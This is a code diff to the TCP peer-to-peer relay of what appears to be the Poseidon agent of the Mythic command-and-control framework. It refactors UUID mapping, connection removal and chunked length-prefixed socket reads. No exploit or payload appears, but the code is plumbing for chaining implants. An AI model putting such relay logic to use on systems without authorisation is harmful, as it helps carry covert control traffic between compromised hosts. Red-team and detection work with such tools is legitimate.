@@ -28,10 +28,11 @@ func (c poseidonTCP) ProfileName() string {
 }
 func (c poseidonTCP) ProcessIngressMessageForP2P(delegate *structs.DelegateMessage) {
 	var err error = nil
+	//utils.PrintDebug(fmt.Sprintf("Locking ProcessIngressMessageForP2P to send message to internal p2p connection"))
 	internalTCPConnectionMutex.Lock()
-	conn, ok := internalTCPConnections[delegate.UUID]
+	conn, ok := internalTCPConnections[delegate.MythicUUID]
 	if !ok {
-		conn, ok = internalTCPConnections[delegate.MythicUUID]
+		conn, ok = internalTCPConnections[delegate.UUID]
 	}
 	if ok {
 		//utils.PrintDebug(fmt.Sprintf("ProcessIngressMessageForP2P:\n%v\n", delegate))
@@ -40,17 +41,19 @@ func (c poseidonTCP) ProcessIngressMessageForP2P(delegate *structs.DelegateMessa
 			utils.PrintDebug(fmt.Sprintf("updating ID: %s from %s\n", delegate.MythicUUID, delegate.UUID))
 			internalTCPConnections[delegate.MythicUUID] = conn
 			internalTCPMapping[delegate.UUID] = delegate.MythicUUID
+			addInternalConnectionUUID(delegate.UUID, delegate.MythicUUID)
 			// remove our old one
 			utils.PrintDebug(fmt.Sprintf("removing internal tcp connection for: %s\n", delegate.UUID))
 			delete(internalTCPConnections, delegate.UUID)
 		}
-		utils.PrintDebug(fmt.Sprintf("Sending ingress data to P2P connection\n"))
+		//utils.PrintDebug(fmt.Sprintf("Sending ingress data to P2P connection\n"))
 		//err = SendTCPData([]byte(delegate.Message), *conn)
 		err = c.ChunkAndWriteData(*conn, []byte(delegate.Message))
 	} else {
 		utils.PrintDebug(fmt.Sprintf("ProcessIngressMessageForP2P: UUID %s not found\n", delegate.UUID))
 	}
 	internalTCPConnectionMutex.Unlock()
+	//utils.PrintDebug(fmt.Sprintf("Unlocked ProcessIngressMessageForP2P to send message to internal p2p connection"))
 	//utils.PrintDebug(c.GetInternalP2PMap())
 	if err != nil {
 		utils.PrintDebug(fmt.Sprintf("Failed to send data to linked p2p connection, %v\n", err))
@@ -60,6 +63,7 @@ func (c poseidonTCP) ProcessIngressMessageForP2P(delegate *structs.DelegateMessa
 func (c poseidonTCP) RemoveInternalConnection(connectionUUID string) bool {
 	internalTCPConnectionMutex.Lock()
 	defer internalTCPConnectionMutex.Unlock()
+	removedSuccessfully := false
 	if conn, ok := internalTCPConnections[connectionUUID]; ok {
 		utils.PrintDebug(fmt.Sprintf("about to remove a connection, %s\n", connectionUUID))
 		//printInternalTCPConnectionMap()
@@ -73,19 +77,20 @@ func (c poseidonTCP) RemoveInternalConnection(connectionUUID string) bool {
 			C2ProfileName:  "tcp",
 		}:
 		}
-		return true
-	} else if mythicUUID, ok := internalTCPMapping[connectionUUID]; ok {
+		removedSuccessfully = true
+	}
+	if mythicUUID, ok := internalTCPMapping[connectionUUID]; ok {
 		select {
 		case RemoveInternalConnectionChannel <- structs.RemoveInternalConnectionMessage{
 			ConnectionUUID: mythicUUID,
 			C2ProfileName:  "tcp",
 		}:
 		}
-		return true
-	} else {
-		// we don't know about this connection we're asked to close
-		return false
+		removedSuccessfully = true
 	}
+	// we don't know about this connection we're asked to close
+	return removedSuccessfully
+
 }
 func (c poseidonTCP) AddInternalConnection(connection interface{}) {
 	//fmt.Printf("handleNewInternalTCPConnections message from channel for %v\n", newConnection)
@@ -131,12 +136,16 @@ func (c poseidonTCP) readFromInternalTCPConnections(newConnection *net.Conn, tem
 			c.RemoveInternalConnection(getInternalConnectionUUID(tempConnectionUUID))
 			return
 		}
+		if len(readBuffer) == 0 {
+			continue
+		}
 		newDelegateMessage := structs.DelegateMessage{}
 		newDelegateMessage.Message = string(readBuffer)
+		//utils.PrintDebug(fmt.Sprintf("creating delegate message for NewDelegatesToMythicChannel. tempUUID : %s, convertedUUID: %s\n", tempConnectionUUID, getInternalConnectionUUID(tempConnectionUUID)))
 		newDelegateMessage.UUID = getInternalConnectionUUID(tempConnectionUUID)
 		//fmt.Printf("converted %s to %s when sending message to Mythic\n", tempConnectionUUID, newDelegateMessage.UUID)
 		newDelegateMessage.C2ProfileName = c.ProfileName()
-		//fmt.Printf("Adding delegate message to channel: %v\n", newDelegateMessage)
+		//utils.PrintDebug(fmt.Sprintf("adding message to responses.NewDelegatesToMythicChannel: %v\n", len(responses.NewDelegatesToMythicChannel)))
 		responses.NewDelegatesToMythicChannel <- newDelegateMessage
 
 	}
@@ -191,6 +200,33 @@ func (c poseidonTCP) ChunkAndWriteData(conn net.Conn, data []byte) error {
 	}
 	return nil
 }
+func (c poseidonTCP) readXBytes(conn net.Conn, numOfBytes uint32) ([]byte, error) {
+	var totalBytes []byte
+	readBuffer := make([]byte, numOfBytes)
+	readSoFar, err := conn.Read(readBuffer)
+	if err != nil {
+		utils.PrintDebug(fmt.Sprintf("failed to read bytes from tcp connection: %v\n", err))
+		return nil, err
+	}
+	totalRead := uint32(readSoFar)
+	for totalRead < uint32(len(readBuffer)) {
+		// we didn't read the full size of the message yet, read more
+		nextBuffer := make([]byte, numOfBytes-totalRead)
+		readSoFar, err = conn.Read(nextBuffer)
+		if err != nil {
+			utils.PrintDebug(fmt.Sprintf("failed to read more bytes from tcp connection: %v\n", err))
+			return nil, err
+		}
+		copy(readBuffer[totalRead:], nextBuffer)
+		totalRead = totalRead + uint32(readSoFar)
+	}
+	// finished reading this chunk and all of its data
+	totalBytes = append(totalBytes, readBuffer...)
+	return totalBytes, nil
+}
+func (c poseidonTCP) bytesToBigEndian(data []byte) uint32 {
+	return binary.BigEndian.Uint32(data)
+}
 func (c poseidonTCP) ReadAndChunkData(conn net.Conn) ([]byte, error) {
 	var sizeBuffer uint32
 	var totalChunks uint32
@@ -199,48 +235,34 @@ func (c poseidonTCP) ReadAndChunkData(conn net.Conn) ([]byte, error) {
 	var totalBytes []byte
 	for {
 		utils.PrintDebug(fmt.Sprintf("Starting to read from p2p connection\n"))
-		err := binary.Read(conn, binary.BigEndian, &sizeBuffer)
+		sizeBytes, err := c.readXBytes(conn, 4)
 		if err != nil {
-			utils.PrintDebug(fmt.Sprintf("failed to read size from tcp connection: %v\n", err))
 			return nil, err
 		}
+		//utils.PrintDebug(fmt.Sprintf("got size bytes: %v\n", sizeBytes))
+		sizeBuffer = c.bytesToBigEndian(sizeBytes)
 		if sizeBuffer == 0 {
-			utils.PrintDebug(fmt.Sprintf("got 0 size from remote connection\n"))
-			return nil, errors.New("got 0 size")
+			//utils.PrintDebug(fmt.Sprintf("got 0 size from remote connection\n"))
+			return nil, nil
 		}
-		err = binary.Read(conn, binary.BigEndian, &totalChunks)
+		totalChunksBytes, err := c.readXBytes(conn, 4)
 		if err != nil {
-			utils.PrintDebug(fmt.Sprintf("failed to read total chunks from tcp connection: %v\n", err))
 			return nil, err
 		}
-		err = binary.Read(conn, binary.BigEndian, &currentChunk)
+		//utils.PrintDebug(fmt.Sprintf("got total chunks bytes: %v\n", totalChunksBytes))
+		totalChunks = c.bytesToBigEndian(totalChunksBytes)
+		currentChunkBytes, err := c.readXBytes(conn, 4)
 		if err != nil {
-			utils.PrintDebug(fmt.Sprintf("failed to read current chunk from tcp connection: %v\n", err))
 			return nil, err
 		}
+		//utils.PrintDebug(fmt.Sprintf("got current chunk bytes: %v\n", currentChunkBytes))
+		currentChunk = c.bytesToBigEndian(currentChunkBytes)
 		utils.PrintDebug(fmt.Sprintf("Starting read for %d/%d chunks, for size %d\n", currentChunk+1, totalChunks, sizeBuffer-8))
-		readBuffer := make([]byte, sizeBuffer-8)
-		readSoFar, err := conn.Read(readBuffer)
-		if err != nil {
-			utils.PrintDebug(fmt.Sprintf("failed to read bytes from tcp connection: %v\n", err))
-			return nil, err
-		}
-		totalRead := uint32(readSoFar)
-		for totalRead < uint32(len(readBuffer)) {
-			// we didn't read the full size of the message yet, read more
-			nextBuffer := make([]byte, sizeBuffer-totalRead)
-			readSoFar, err = conn.Read(nextBuffer)
-			if err != nil {
-				utils.PrintDebug(fmt.Sprintf("failed to read more bytes from tcp connection: %v\n", err))
-				return nil, err
-			}
-			copy(readBuffer[totalRead:], nextBuffer)
-			totalRead = totalRead + uint32(readSoFar)
-		}
+		chunkBytes, err := c.readXBytes(conn, sizeBuffer-8)
 		// finished reading this chunk and all of its data
-		totalBytes = append(totalBytes, readBuffer...)
+		totalBytes = append(totalBytes, chunkBytes...)
 		//copy(totalBytes[len(totalBytes):], readBuffer[:])
-		utils.PrintDebug(fmt.Sprintf("Finished read for %d/%d chunks, for size %d\n", currentChunk+1, totalChunks, totalRead))
+		utils.PrintDebug(fmt.Sprintf("Finished read for %d/%d chunks, for size %d\n", currentChunk+1, totalChunks, sizeBuffer-8))
 		if currentChunk+1 == totalChunks {
 			utils.PrintDebug(fmt.Sprintf("Finished read for all chunks, for size %d\n", len(totalBytes)))
 			return totalBytes, nil
